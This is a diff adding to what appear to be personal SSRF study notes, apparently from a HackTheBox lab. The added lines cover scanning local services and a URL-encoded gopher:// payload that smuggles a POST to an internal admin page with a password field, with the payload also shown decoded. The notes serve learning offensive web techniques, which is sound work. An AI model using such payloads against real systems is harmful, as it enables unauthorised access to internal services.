@@ -2,6 +2,7 @@
 //! Exploiting
 //* can be used to :
 // scan the local addresses to see if any other systems are running on 192.168.0.X:8080
+// scan the application running locally on 127.0.0.1:x
 //! Filter Bypass
 //* localhost equivalents
 // 127.0.0.1
@@ -30,3 +31,13 @@
 // case variation
 //? for more examples
 // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
+//! The gopher Protocol
+// * send post request over what looks like only getable
+// if the libaray used support the gopher protocol
+// gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+// that is just this :
+// POST /admin.php HTTP/1.1
+// Host: dateserver.htb
+// Content-Length: 13
+// Content-Type: application/x-www-form-urlencoded
+// adminpw=admin
